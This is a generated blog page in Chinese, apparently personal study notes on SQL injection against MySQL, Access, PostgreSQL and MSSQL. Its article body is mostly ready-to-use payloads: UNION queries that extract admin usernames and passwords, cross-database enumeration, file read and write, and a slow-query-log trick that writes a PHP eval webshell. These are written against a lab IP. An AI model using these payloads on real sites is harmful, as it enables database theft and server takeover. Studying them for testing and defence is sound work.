@@ -1,0 +1,301 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入 | yk1ng</title><meta name="author" content="yk1ng"><meta name="copyright" content="yk1ng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入&amp;MYSQL跨库&amp;ACCESS偏移原理脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。这一个过程就可以叫做SQL注入漏洞。 漏洞产生根本条件可控变量 特定函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="https://yzhikang.github.io/2024/03/22/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="yk1ng">
+<meta property="og:description" content="SQL注入&amp;MYSQL跨库&amp;ACCESS偏移原理脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。这一个过程就可以叫做SQL注入漏洞。 漏洞产生根本条件可控变量 特定函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yzhikang.github.io/img/blog.png">
+<meta property="article:published_time" content="2024-03-22T10:36:31.000Z">
+<meta property="article:modified_time" content="2024-03-22T10:39:48.933Z">
+<meta property="article:author" content="yk1ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yzhikang.github.io/img/blog.png"><link rel="shortcut icon" href="/img/touxiang.png"><link rel="canonical" href="https://yzhikang.github.io/2024/03/22/SQL%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: yk1ng","link":"链接: ","source":"来源: yk1ng","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-22 18:39:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/blog.png')"><nav id="nav"><span id="blog-info"><a href="/" title="yk1ng"><span class="site-name">yk1ng</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2024-03-22T10:36:31.000Z" title="发表于 2024-03-22 18:36:31">2024-03-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL注入-amp-MYSQL跨库-amp-ACCESS偏移"><a href="#SQL注入-amp-MYSQL跨库-amp-ACCESS偏移" class="headerlink" title="SQL注入&amp;MYSQL跨库&amp;ACCESS偏移"></a>SQL注入&amp;MYSQL跨库&amp;ACCESS偏移</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。这一个过程就可以叫做SQL注入漏洞。</p>
+<h2 id="漏洞产生根本条件"><a href="#漏洞产生根本条件" class="headerlink" title="漏洞产生根本条件"></a>漏洞产生根本条件</h2><h3 id="可控变量-特定函数"><a href="#可控变量-特定函数" class="headerlink" title="可控变量 特定函数"></a>可控变量 特定函数</h3><p><a target="_blank" rel="noopener" href="http://192.168.46.160:85/Production/PRODUCT.asp">http://192.168.46.160:85/Production/PRODUCT.asp</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.46.160:85/Production/PRODUCT.asp?id=1513">http://192.168.46.160:85/Production/PRODUCT.asp?id=1513</a></p>
+<p>如果下面的URL地址测试注入判断id有注入，手工测试该如何进行？</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.46.160:85/Production/PRODUCT.asp?id=1513&page=1">http://192.168.46.160:85/Production/PRODUCT.asp?id=1513&amp;page=1</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.46.160:85/Production/PRODUCT.asp?page=1&id=1513">http://192.168.46.160:85/Production/PRODUCT.asp?page=1&amp;id=1513</a></p>
+<p>Production&#x2F;PRODUCT.asp?id&#x3D;1513 注入语句&amp;page&#x3D;1 对</p>
+<p>Production&#x2F;PRODUCT.asp?id&#x3D;1513&amp;page&#x3D;1 注入语句 错</p>
+<h2 id="SQL注入攻击流程："><a href="#SQL注入攻击流程：" class="headerlink" title="SQL注入攻击流程："></a>SQL注入攻击流程：</h2><p>1、猜测数据库类型</p>
+<p>2、根据类型选择思路</p>
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>ACCESS 独立存在</p>
+<p>数据库名</p>
+<p>  表名</p>
+<p>​    列名</p>
+<p>​      数据</p>
+<p>​            </p>
+<p>MYSQL 统一管理</p>
+<p>最高数据库用户&#x3D;root用户</p>
+<p>数据库A&#x3D;网站A&#x3D;数据库用户A</p>
+<p>  表名</p>
+<p>​    列名</p>
+<p>​      数据</p>
+<p>数据库B&#x3D;网站B&#x3D;数据库用户B</p>
+<p>数据库C&#x3D;网站C&#x3D;数据库用户C</p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>为了网站和数据库的安全性，MYSQL内置有ROOT最高用户，划分等级，每个用户对应管理一个数据库，这样保证无不关联，从而不会影响到其他数据库的运行。</p>
+<h3 id="MYSQL两种思路"><a href="#MYSQL两种思路" class="headerlink" title="MYSQL两种思路"></a>MYSQL两种思路</h3><p>​            1、     非ROOT的注入攻击：常规类的猜解</p>
+<p>​            2、     ROOT用户的注入攻击：文件读写操作，跨库查询注入等</p>
+<p>黑盒测试中可以采用user()获取当前用户权限，白盒中看连接用户即可！</p>
+<p>select * from product where id&#x3D;1513 </p>
+<p>select * from product where id&#x3D;1513 </p>
+<p>查询admin表名：</p>
+<p>UNION select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p>
+<p>查询admin表名下的admin等列名</p>
+<p>UNION select 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p>
+<p>MYSQL5.0以上版本：自带的数据库名information_schema</p>
+<p>information_schema：存储数据库下的数据库名及表名，列名信息的数据库</p>
+<p>information_schema.tables：记录表名信息的表</p>
+<p>information_schema.columns：记录列名信息表</p>
+<p>information_schema.tables</p>
+<h3 id="获取相关数据"><a href="#获取相关数据" class="headerlink" title="获取相关数据"></a>获取相关数据</h3><p>1、数据库版本-看是否符合information_schema查询-version()-5.5.532</p>
+<p>2、数据库用户-看是否符合ROOT型注入攻击-user()-root@localhost</p>
+<p>3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os-win</p>
+<p>4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()-syguestbook</p>
+<p>ROOT类型攻击-猜解数据，文件读写，跨库查询</p>
+<p>获取syguestbook数据库下面的表名信息：</p>
+<p>UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema&#x3D;’syguestbook’</p>
+<p>获取表名sy_adminuser的列名信息：</p>
+<p>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name&#x3D;’sy_adminuser’ and table_schema&#x3D;’syguestbook’</p>
+<p>获取指定数据：</p>
+<p>UNION SELECT username,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from sy_adminuser</p>
+<p>跨库注入：实现当前网站跨库查询其他数据库对应网站的数据</p>
+<p>获取当前mysql下的所有数据库名</p>
+<p>UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.schemata</p>
+<p>获取数据库名xhcms下的表名信息</p>
+<p>UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema&#x3D;’xhcms’</p>
+<p>获取数据库名xhcms下的表manage下的列名信息：</p>
+<p>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name&#x3D;’manage’ and table_schema&#x3D;’xhcms’</p>
+<p>获取指定数据：</p>
+<p>UNION SELECT user,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from xhcms.manage</p>
+<h3 id="ASP-Access-简易注入-字典猜解"><a href="#ASP-Access-简易注入-字典猜解" class="headerlink" title="ASP+Access-简易注入-字典猜解"></a>ASP+Access-简易注入-字典猜解</h3><p>由于Access数据库特性导致这个SQL注入是需要借助字典去猜解表名和列名的，那么就会出现表名或列名猜解不到，可以自定义社工字典或采用偏移注入！</p>
+<h3 id="ASP-Access-偏移注入-报错显示"><a href="#ASP-Access-偏移注入-报错显示" class="headerlink" title="ASP+Access-偏移注入-报错显示"></a>ASP+Access-偏移注入-报错显示</h3><p>偏移注入就是解决表名已知，列名未知的情况！</p>
+<h3 id="MYSQL-root高权限读写注入"><a href="#MYSQL-root高权限读写注入" class="headerlink" title="MYSQL-root高权限读写注入"></a>MYSQL-root高权限读写注入</h3><p>-读取文件：</p>
+<p>UNION SELECT 1,load_file(‘d:&#x2F;w.txt’),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</p>
+<p>-写入文件：</p>
+<p>UNION SELECT 1,’xxxx’,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile ‘d:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a>‘</p>
+<p>-路径获取：phpinfo,报错,字典等</p>
+<p>-无法写入：secure_file_priv突破 注入中需要支持SQL执行环境，没有就需要借助phpmyadmin或能够直接连上对方数据库进行绕过</p>
+<p>set global slow_query_log&#x3D;1;</p>
+<p>set global slow_query_log_file&#x3D;’shell路径’;</p>
+<p>select ‘<?php eval($_GET[A])?>‘ or SLEEP(1);</p>
+<h3 id="PostgreSQL-高权限读写注入"><a href="#PostgreSQL-高权限读写注入" class="headerlink" title="PostgreSQL-高权限读写注入"></a>PostgreSQL-高权限读写注入</h3><p>-测列数：</p>
+<p>order by 4</p>
+<p>and 1&#x3D;2 union select null,null,null,null</p>
+<p>-测显位：第2，3</p>
+<p>and 1&#x3D;2 union select ‘null’,null,null,null 错误</p>
+<p>and 1&#x3D;2 union select null,’null’,null,null 正常</p>
+<p>and 1&#x3D;2 union select null,null,’null’,null 正常</p>
+<p>and 1&#x3D;2 union select null,null,null,’null’ 错误</p>
+<p>-获取信息：</p>
+<p>and 1&#x3D;2 UNION SELECT null,version(),null,null</p>
+<p>and 1&#x3D;2 UNION SELECT null,current_user,null,null</p>
+<p>and 1&#x3D;2 union select null,current_database(),null,null</p>
+<p>-获取数据库名：</p>
+<p>and 1&#x3D;2 union select null,string_agg(datname,’,’),null,null from pg_database</p>
+<p>-获取表名：</p>
+<p>1、and 1&#x3D;2 union select null,string_agg(tablename,’,’),null,null from pg_tables where schemaname&#x3D;’public’</p>
+<p>2、and 1&#x3D;2 union select null,string_agg(relname,’,’),null,null from pg_stat_user_tables</p>
+<p>-获取列名：</p>
+<p>and 1&#x3D;2 union select null,string_agg(column_name,’,’),null,null from information_schema.columns where table_name&#x3D;’reg_users’</p>
+<p>-获取数据：</p>
+<p>and 1&#x3D;2 union select null,string_agg(name,’,’),string_agg(password,’,’),null from reg_users</p>
+<p>-补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：</p>
+<p>and 1&#x3D;2 union select null,string_agg(usename,’,’),null,null FROM pg_user WHERE usesuper IS TRUE</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/249371.html">https://www.freebuf.com/sectool/249371.html</a></p>
+<h3 id="MSSQL-sa高权限读写执行注入"><a href="#MSSQL-sa高权限读写执行注入" class="headerlink" title="MSSQL-sa高权限读写执行注入"></a>MSSQL-sa高权限读写执行注入</h3><p>-测列数：</p>
+<p>order by 4</p>
+<p>and 1&#x3D;2 union all select null,null,null,null</p>
+<p>-测显位：</p>
+<p>and 1&#x3D;2 union all select null,1,null,null</p>
+<p>and 1&#x3D;2 union all select null,null,’s’,null</p>
+<p>-获取信息：</p>
+<p>@@version 获取版本信息</p>
+<p>db_name() 当前数据库名字</p>
+<p>user、system_user,current_user,user_name 获取当前用户名</p>
+<p>@@SERVERNAME 获取服务器主机信息</p>
+<p>and 1&#x3D;2 union all select null,db_name(),null,null</p>
+<p>-获取表名：</p>
+<p>and 1&#x3D;2 union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype&#x3D;’u’),null,null</p>
+<p>union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype&#x3D;’u’ and name not in (‘manage’)),null,null</p>
+<p>-获取列名：</p>
+<p>and 1&#x3D;2 union all select null,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),null,null</p>
+<p>and 1&#x3D;2 union all select null,(select top 1 col_name(object_id(‘manage’),2) from sysobjects),null,null</p>
+<p>and 1&#x3D;2 union all select null,(select top 1 col_name(object_id(‘manage’),3) from sysobjects),null,null</p>
+<p>and 1&#x3D;2 union all select null,(select top 1 col_name(object_id(‘manage’),4) from sysobjects),null,null</p>
+<p>-获取数据：</p>
+<p>and 1&#x3D;2 union all select null,username, password ,null from manage</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yzhikang.github.io">yk1ng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yzhikang.github.io/2024/03/22/SQL%E6%B3%A8%E5%85%A5/">https://yzhikang.github.io/2024/03/22/SQL%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yzhikang.github.io" target="_blank">yk1ng</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/blog.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/21/rce%E5%AD%A6%E4%B9%A0/" title="rce学习"><img class="cover" src="/img/blog.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">rce学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yk1ng</div><div class="author-info__description">还是做不到嘛</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到yk1ng的技术杂货铺，如果喜欢记得收藏奥～</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-amp-MYSQL%E8%B7%A8%E5%BA%93-amp-ACCESS%E5%81%8F%E7%A7%BB"><span class="toc-number">1.</span> <span class="toc-text">SQL注入&amp;MYSQL跨库&amp;ACCESS偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E6%A0%B9%E6%9C%AC%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞产生根本条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E6%8E%A7%E5%8F%98%E9%87%8F-%E7%89%B9%E5%AE%9A%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">可控变量 特定函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">SQL注入攻击流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-number">1.4.</span> <span class="toc-text">结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">1.5.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL%E4%B8%A4%E7%A7%8D%E6%80%9D%E8%B7%AF"><span class="toc-number">1.5.1.</span> <span class="toc-text">MYSQL两种思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE"><span class="toc-number">1.5.2.</span> <span class="toc-text">获取相关数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASP-Access-%E7%AE%80%E6%98%93%E6%B3%A8%E5%85%A5-%E5%AD%97%E5%85%B8%E7%8C%9C%E8%A7%A3"><span class="toc-number">1.5.3.</span> <span class="toc-text">ASP+Access-简易注入-字典猜解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASP-Access-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%98%BE%E7%A4%BA"><span class="toc-number">1.5.4.</span> <span class="toc-text">ASP+Access-偏移注入-报错显示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-root%E9%AB%98%E6%9D%83%E9%99%90%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.5.</span> <span class="toc-text">MYSQL-root高权限读写注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E9%AB%98%E6%9D%83%E9%99%90%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.6.</span> <span class="toc-text">PostgreSQL-高权限读写注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-sa%E9%AB%98%E6%9D%83%E9%99%90%E8%AF%BB%E5%86%99%E6%89%A7%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.7.</span> <span class="toc-text">MSSQL-sa高权限读写执行注入</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/22/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img src="/img/blog.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2024/03/22/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2024-03-22T10:36:31.000Z" title="发表于 2024-03-22 18:36:31">2024-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/21/rce%E5%AD%A6%E4%B9%A0/" title="rce学习"><img src="/img/blog.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="rce学习"/></a><div class="content"><a class="title" href="/2024/03/21/rce%E5%AD%A6%E4%B9%A0/" title="rce学习">rce学习</a><time datetime="2024-03-20T16:28:19.000Z" title="发表于 2024-03-21 00:28:19">2024-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/21/Linux%E6%93%8D%E4%BD%9C/" title="Linux操作"><img src="/img/blog.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux操作"/></a><div class="content"><a class="title" href="/2024/03/21/Linux%E6%93%8D%E4%BD%9C/" title="Linux操作">Linux操作</a><time datetime="2024-03-20T16:20:14.000Z" title="发表于 2024-03-21 00:20:14">2024-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="SSTI模板注入"><img src="/img/blog.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSTI模板注入"/></a><div class="content"><a class="title" href="/2024/03/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="SSTI模板注入">SSTI模板注入</a><time datetime="2024-03-20T09:39:42.000Z" title="发表于 2024-03-20 17:39:42">2024-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/20/2024%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="2024新的博客"><img src="/img/blog.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024新的博客"/></a><div class="content"><a class="title" href="/2024/03/20/2024%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="2024新的博客">2024新的博客</a><time datetime="2024-03-20T09:14:16.000Z" title="发表于 2024-03-20 17:14:16">2024-03-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By yk1ng</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i 